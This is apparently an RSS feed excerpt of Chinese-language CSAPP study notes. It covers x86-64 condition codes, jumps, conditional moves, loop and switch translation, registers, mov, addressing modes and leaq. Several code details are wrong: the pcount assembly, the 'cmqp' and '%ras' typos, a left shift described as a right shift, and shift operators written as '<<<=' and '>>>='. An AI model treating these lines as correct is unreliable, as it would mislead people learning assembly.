&lt;td align=&quot;left&quot;&gt;(SF^OF)&amp;amp;#124ZF&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;less or equal(signed)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;seta&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;del&gt;CF&amp;amp;&lt;/del&gt;ZF&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;above(unsigned)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;setb&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;CF&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;below(unsigned)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;在x86-64整数寄存器中,能够使用最低一字节来存放以上结果
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250118232534.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;举例&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int gt(long x,long y){
	return x &amp;gt; y;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对应的汇编代码:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;gt:
	cmpq   %rsi, %rdi    # 比较%rdi-%rsi
	setg   %al           # 当 &amp;gt; 时设置
	movzbl %al, %eax     # mov with zero byte to longword, 因为返回int类型是4字节长字,所以使用%eax
	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;需要说明一点,x86-64中当结果是32位时会把剩余的32位设置为0.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;条件分支&lt;/h1&gt;
&lt;h2&gt;跳转j*指令&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;j*&lt;/th&gt;
&lt;th&gt;条件&lt;/th&gt;
&lt;th&gt;含义&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;code&gt;jmp&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;条件为真时执行&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;je&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;ZF&lt;/td&gt;
&lt;td&gt;equal/zero&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;jne&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;~ZF&lt;/td&gt;
&lt;td&gt;not equal/not zero&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;js&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;SF&lt;/td&gt;
&lt;td&gt;negative&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;jns&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;~SF&lt;/td&gt;
&lt;td&gt;nonnegative&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;jg&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;del&gt;(SF^OF)&amp;amp;&lt;/del&gt;ZF&lt;/td&gt;
&lt;td&gt;greater(signed)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;jge&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;~(SF^OF)&lt;/td&gt;
&lt;td&gt;greater or equal(signed)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;jl&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;(SF^OF)&lt;/td&gt;
&lt;td&gt;less(signed)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;jle&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;(SF^OF)&amp;amp;#124ZF&lt;/td&gt;
&lt;td&gt;less or equal(signed)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;ja&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;del&gt;CF&amp;amp;&lt;/del&gt;ZF&lt;/td&gt;
&lt;td&gt;above(unsigned)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;jb&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;CF&lt;/td&gt;
&lt;td&gt;below(unsigned)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h2&gt;使用条件分支的例子(旧式)&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* control.c */
long absdiff(long x,long y){
	long result;
	if(x&amp;gt;y)
		result = x-y;
	else
		result = y-x;
	return result;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;生成汇编代码(不使用条件移动)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gcc -Og -S -fno-if-conversion control.c
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;absdiff:
	cmpq    %rsi, %rdi    # x, y
	jle     .L4
	movq    %rdi, %rax
	subq    %rsi, %rax
	ret
.L4:                     # x &amp;lt;= y
	movq    %rsi, %rax
	subq    %rdi, %rax
	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看到,jump语句就像C语言中的goto语句&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;long absdiff_j (long x, long y) {
	long result; 
	int ntest = x &amp;lt;= y; 
	if (ntest) goto Else; 
	result = x-y; 
	goto Done; 
Else: 
	result = y-x; 
Done: 
	return result; }
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;使用条件移动(优化)&lt;/h2&gt;
&lt;p&gt;将if-then-else逻辑中then和else都先执行得到两个结果,然后再决定使用哪一个结果
事实证明在非常简单的运算中这样更有效率!
原因:分支会对管道中的指令流造成极大的干扰;条件移动不需要控制权转移&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* 三元运算符 */
	val = test ? then_expr : else_expr;
/* goto */
	result = then_expr;
	eval = else_expr;
	nt = !test;
	if(nt) result = eval;
	return result;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;gcc会在安全的前提下使用.
对应的汇编代码&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;absdiff:
	movq    %rdi, %rax    # x
	subq    %rsi, %rax    # result = x - y
	movq    %rsi, %rdx    # y
	subq    %rdi, %rdx    # eval = y - x
	cmqp    %rsi, %rdi    # 比较x, y
	cmovle  %rdx, %rax    # 如果x&amp;lt;=y,result = eval
	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;不宜使用条件移动的情况:&lt;ol&gt;
&lt;li&gt;两种结果计算难度大:只有计算简单的情况下才有明显效果&lt;/li&gt;
&lt;li&gt;有不良副作用:例如 &lt;code&gt;val = p ? *p : 0;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;污染数据甚至影响判断本身:例如 &lt;code&gt;val = x&amp;gt;0 ? x*=y : x+=3;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;循环&lt;/h1&gt;
&lt;p&gt;在C语言中,循环结构的实现语句有while语句,for语句,do-while语句,还可以使用goto语句来跳转.而使用goto更接近于汇编语言的实现方式.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* 使用goto */
long pcount_goto (unsigned long x) { 
	long result = 0; 
	loop: 
		result += x &amp;amp; 0x1; 
		x &amp;gt;&amp;gt;= 1; 
		if(x) goto loop; 
		return result; 
}// 计数x中1的个数
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对应的汇编代码:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;	movl    $0, %eax    # result = 0;
.L2:
	movq    %rdi, %rdx
	addl    %$1, %edx   # t = x&amp;amp;0x1;
	addq    %rdx, %rax  # result += 1;
	shrq    $1, %rax    # x &amp;gt;&amp;gt;=1;
	jne     .L2         # if(x) goto loop;
	rep; ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将while语句转换成goto循环:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* whlie */
while(test)
	{BODY}


/* goto */
	goto TEST;
LOOP:
	{BODY}
TEST:
	if(test)
		goto loop;
DONE:
	...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;将do-while语句转换成goto循环:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* do-whlie */
do
	{BODY}
while(test);

/* goto */
LOOP:
	{BODY}
TEST:
	if(test)
		goto LOOP;
DONE:
	...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;值得一提的是,gcc使用不同的优化级别会对while语句做出不同的翻译&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用-Og&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* whlie */
while(test)
	{BODY}


/* goto */
	goto TEST;
LOOP:
	{BODY}
TEST:
	if(test)
		goto loop;
DONE:
	...
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;使用-O1&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* whlie */
while(test)
	{BODY}

/* do-while */
if(!test)
	goto DONE;
do
	{BODY}
while(test);
DONE:
	...

/* goto */
if(!test)
	goto DONE;
LOOP:
	{BODY}
	if(test)
		goto loop;
DONE:
	...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;仔细看,-Og完全顺着C代码的逻辑;而-O1不使用TEST标志,更加简洁.
对于for循环,可以转换成while语句&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* for */
for(Init;Test;Update)
	Body

/* while */
Init;
while(Test)
	Body
	Update
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果使用-O1优化,编译器会略去Init后第一次Test,因为通常是满足的.&lt;/p&gt;
&lt;h1&gt;switch语句跳转&lt;/h1&gt;
&lt;p&gt;我们知道,switch语句比if-else语句判断更快.相应地,它对应的机器代码不同.
switch的每一种case在编译器编译时必须是常量.&lt;/p&gt;
&lt;h2&gt;跳转表(jump table)的结构&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250119172324.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;把所有代码块编译成一块总代码,并将它们存储在内存,加载内存就能得到这些代码块
跳转表就像一个数组,如果知道索引就能随机存取,不必遍历寻找.这就是switch语句的汇编代码的基本思想.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;举例说明&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;long switch_eg(long x){
	long w = 1;
	switch(x){
		// case 0:
		case 1: ... break;
		case 2: ... /* Fall Through */
		case 3: ... break;
		// case 4:
		case 5:
		case 6: ... break;
		default: ...
	}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对应的汇编代码:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;switch_eg:
	...
	cmpq    $6, %rdi
	ja      .L8             # 负数和大于6的情况对于解析成unsigned类型来说都是above,这是default情况
	jmp     *.L4(,%rdi,8)   # goto *JTab[x]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;建立跳转表:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;.section    .rodata
	.align 8
.L4:
	.quad    .L8  # x = 0
	.quad    .L3  # x = 1
	.quad    .L5  # x = 2
	.quad    .L9  # x = 3
	.quad    .L8  # x = 4
	.quad    .L7  # x = 5
	.quad    .L7  # x = 6
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;quad只是一个声明,表示这里需要一个8字节的值&lt;/p&gt;
&lt;p&gt;现在,分别来看各个代码块&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;x == 1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;switch(x){
	case 1:
		w = y*z;
		break;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;.L3:
	movq    %rsi, %rax    # y
	imulq   %rdx, %rax   # y*z
	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Fall Through的情况&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;switch(x){
	...
	case 2:
		w = y/z;
		/* Fall Through */
	case 3:
		w += z;
		break;
	...
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;分割为&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;case 2:
	w = y/z;
	goto merge;
case 3:
	w = 1;
merge:
	w += z;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250119180655.png&quot; alt=&quot;&quot;&gt;
实际的汇编代码:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;.L5:                    # case 2
	movq    %rsi, %rax
	cqto
	idivq   %rcx        # y/z
	jmp     .L6
.L9:                    # case 3
	movl    $1, %eax    # w = 1
.L6:
	addq    %rcx, %rax  # w += z
	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;跳转表是编译器自动生成的.
如果case有负数,会进行偏置处理,使得最小值是0;
如果case情况少且数值相差大(稀疏),建立跳转表有大量冗余,就会转成if-else结构.
从中我们可以看出编译器十分聪明!
需要在程序执行之前建立好平衡二叉树跳转表,这就是C语言要求case 是常量的原因!&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Fri, 17 Jan 2025 16:00:00 GMT</pubDate></item><item><title>机器级编程I(基础)</title><link>https://tankimzeg.top/blog/csapp/machine-level-programming-i/</link><guid isPermaLink="true">https://tankimzeg.top/blog/csapp/machine-level-programming-i/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/csapp/machine-level-programming-i/&quot;&gt;https://tankimzeg.top/blog/csapp/machine-level-programming-i/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;英特尔/AMD处理器的历史和架构构&lt;/h1&gt;
&lt;h1&gt;C语言,汇编语言,机器代码&lt;/h1&gt;
&lt;h2&gt;定义&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;指令集架构(ISA:instruction set architecture)
  处理器设计用于理解和编写汇编/机器代码的部分&lt;/li&gt;
&lt;li&gt;微架构:架构的实现&lt;/li&gt;
&lt;li&gt;代码形式:&lt;ul&gt;
&lt;li&gt;机器代码:处理器执行的字节级别的程序&lt;/li&gt;
&lt;li&gt;汇编代码:代表机器代码的文本&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ISA有intel x86-64,ARM等&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;汇编/机器代码概览&lt;/h2&gt;
&lt;p&gt;![](attachments/Pasted image%2020250117182544.png%20)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;程序计数器(PC:Program counter):存放下一个指令的地址&lt;/li&gt;
&lt;li&gt;寄存器文件(Register):程序中重复使用的数据&lt;/li&gt;
&lt;li&gt;条件码(Condition code):存储指令的运行结果,逻辑运算的结果,用于实现条件分支&lt;/li&gt;
&lt;li&gt;内存:地址数组,存放数据和代码,栈支持进程&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;C语言编译原理&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250117184342.png&quot; alt=&quot;&quot;&gt;
编译其实是一系列步骤,gcc其实也是一系列程序&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;编译成汇编语言&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;C语言源代码:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* sum.c */
long plus(long x, long y);

void sumstore(long x, long y, long *dest){
	long t = plus(x, y);
	*dest = t;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用命令生成汇编代码:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;gcc -Og -S sum.c
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对应产生的汇编语言代码(主要部分)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;sumstore: 
	pushq %rbx 
	movq %rdx, %rbx 
	call plus 
	movq %rax, (%rbx)
	popq %rbx
	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;汇编语言中,整数数据占有1,2,4,8字节
浮点数据占有4,8,或10字节
注意数组,结构体这些数据类型不存在于机器级别,是由编译器产生的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;反汇编器:从目标代码转回到汇编代码,变量的名称会丢失
首先,只需要由一个可执行文件,这是一个二进制文件&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gcc -Og sum.c -o sum
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以使用objdump程序&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;objdump -d sum
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;或者使用gdb&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;gdb sum
(gdb) disassemble sumstore
Dump of assembler code funtion sumstore:
	0x0000000000400595 &amp;lt;+0&amp;gt;:    push %rbx
	0x0000000000400596 &amp;lt;+1&amp;gt;:    mov %rdx,%rbx
	0x0000000000400599 &amp;lt;+4&amp;gt;:    callq 0x400590 &amp;lt;plus&amp;gt;
	0x000000000040059e &amp;lt;+9&amp;gt;:    mov %rax,(%rbx)
	0x00000000004005a1 &amp;lt;+12&amp;gt;:    pop %rbx      
	0x00000000004005a2 &amp;lt;+13&amp;gt;:    retq         
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;&lt;p&gt;运行汇编程序
把文本表示的指令变成实际的字节指令&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;链接器
将不同的文件融合在一起,包括我编写的程序和库文件
当运行程序时,可能还有一些库在程序首次开始时动态导入&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1&gt;汇编基础:寄存器,操作数,move指令&lt;/h1&gt;
&lt;h2&gt;x86-64的整数寄存器&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250118182908.png&quot; alt=&quot;&quot;&gt;
有16个寄存器可以用来保存整数和指针,其中一些以字母为名,一些以数字为名
使用%r的是64位,使用%e的是32位,%e版本只是%r实体的低32位.&lt;/p&gt;
&lt;p&gt;IA32的8个寄存器就是上面的所有%e
旧机器可以使用这些寄存器的低16位(2字节)和低8位(1字节),已经是&amp;quot;历史遗产&amp;quot;了.
&lt;img src=&quot;https://tankimzeg.top/attachments/Pasted%20image%2020250118184424.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;mov指令&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;movq src, dst&lt;/code&gt; : 复制src到dest&lt;/p&gt;
&lt;h2&gt;操作数的类型&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;立即数:常整数&lt;ul&gt;
&lt;li&gt;类似于C语言的常量,但是带有&amp;#39;$&amp;#39;,例如 &lt;code&gt;$0x400&lt;/code&gt;,&lt;code&gt; $-533&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;编码为1,2或4字节&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;寄存器:16个整数寄存器之一&lt;ul&gt;
&lt;li&gt;例如&lt;code&gt;%rax&lt;/code&gt;,&lt;code&gt;%r13&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%rsp&lt;/code&gt;是保留为特殊用途&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;内存:寄存器保存的地址对应的内存&lt;ul&gt;
&lt;li&gt;在寄存器的名称外加上括号,例如:&lt;code&gt;(%rax)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;mov和操作数的合并使用&lt;/h2&gt;
&lt;p&gt;$$
\text{movq}
\left { \begin{matrix} 
\text{Imm} \left { \begin{matrix} \text{Reg} &amp;amp;&amp;amp; \text{movq ;$0x4,%rax} &amp;amp;&amp;amp; \text{把%rax的值设置为0x4}\ \text{Mem} &amp;amp;&amp;amp; \text{movq;$-147,(%rax)} &amp;amp;&amp;amp; \text{把%rax指向的内存设置为-147} \end{matrix}\right. \ 
\text{Reg}   \left { \begin{matrix} \text{Reg} &amp;amp;&amp;amp; \text{movq %rax,%rdx} &amp;amp;&amp;amp; \text{把%rax的值复制到%rdx}\ \text{Mem} &amp;amp;&amp;amp;  \text{movq;%rax,(%rdx)}&amp;amp;&amp;amp;\text{把%rax的值复制到%rdx指向的内存}\ \end{matrix}\right. \&lt;br&gt;\text{Mem};;;;;;;; \text{Reg} ;;;;;;;\text{movq;(%rax),%rdx};;;;;;\text{把%rax指向的内存的内容复制到%rdx} \
 \end{matrix}\right.
$$
不允许从一个内存直接复制到另一个内存,立即数是常量不能当&amp;quot;右值&amp;quot;,所以一共有5中组合&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一个简单的例子&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;void swap(long *xp,long *yp){
	long t0 = *xp;
	long t1 = *yp;
	*xp = t1;
	*yp = t0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这是一个简单的交换内存中两个数的函数,(long类型刚好能用%r的6位模式),对应生成的汇编代码的核心部分为:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;swap:
	movq (%rdi), %rax
	movq (%rsi), %rdx
	movq %rdx, (%rdi)
	movq %rax, (%rsi)
	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里解释一下,在x86中,函数的参数总是复制在特定的寄存器中:
%rdi是存放第一个参数寄存器
%rsi是存放第二个参数寄存器
%rax是存放返回值的寄存器
最多可以有6个.&lt;/p&gt;
&lt;h2&gt;内存地址的引用方式&lt;/h2&gt;
&lt;p&gt;上面我们已经看到通过在寄存器名称外加括号能够表示寄存器的值指向的内存.也有更高级,普遍的方法:&lt;/p&gt;
&lt;h3&gt;一般格式&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;D(Rb,Ri,S)&lt;/code&gt;表示Mem[Reg[Rb]+S*Reg[Ri]+D]&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;D(displacement)是固定偏移量(字节)&lt;/li&gt;
&lt;li&gt;Rb(base register)是基址:任意16个寄存器之一&lt;/li&gt;
&lt;li&gt;Ri(index register)是索引:除了%rsp的任意寄存器&lt;/li&gt;
&lt;li&gt;S(scale)是比例因子:(1 for char,2 for short,4 for int或8for long).&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;特殊格式&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;格式&lt;/th&gt;
&lt;th&gt;表示的内存&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;code&gt;(Rb,Ri) &lt;/code&gt;&lt;/td&gt;
&lt;td&gt;Mem[Reg[Rb]+Reg[Ri]]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;D(Rb,Ri)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;Mem[Reg[Rb]+Reg[Ri]+D]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;(Rb,Ri,S)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;Mem[Reg[Rb]+S*Reg[Ri]]&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;D(,Ri,S)&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;Mem[S*Reg[Ri]+D]&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h2&gt;leaq指令&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;leaq src,dst&lt;/code&gt;:src是一块内存,将其对应的地址保存到dst.类似于C语言中的&amp;amp;取值运算符.dst必须是寄存器.
看起来像是mov指令,但这是一种非常方便的算术运算方式,无需内存引用,所以C编译器喜欢使用它&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一个简单的例子&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;long m12(long x){
	return x*12;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;对应的汇编代码的核心部分:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-x86asm&quot;&gt;leaq (%rdi,%rdi,2), %ras    # t = x+x*2
salq $2, %rax               # 右移2位,相当于乘4
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;其他指令&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;指令&lt;/th&gt;
&lt;th align=&quot;left&quot;&gt;对应代码&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;code&gt;addq src,dst&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst += src; &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;subq src,dst&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst -= src; &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;imulq src,dst&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst *= src; &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;salq src,dst&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst &amp;lt;&amp;lt;= src; &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;sarq src,dst&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst &amp;gt;&amp;gt;= src; &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;shlq src,dst&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst &amp;lt;&amp;lt;&amp;lt;= src; &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;shrq src,dst&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst &amp;gt;&amp;gt;&amp;gt;= src; &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;xorq src,dst&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst ^= src; &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;andq src,dst&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst &amp;amp;= src; &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;orq src,dst&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst &amp;amp;#124= src; &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;notq dst&lt;/code&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;code&gt;dst = ~dst;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;incq dst&lt;/code&gt;&lt;/td&gt;
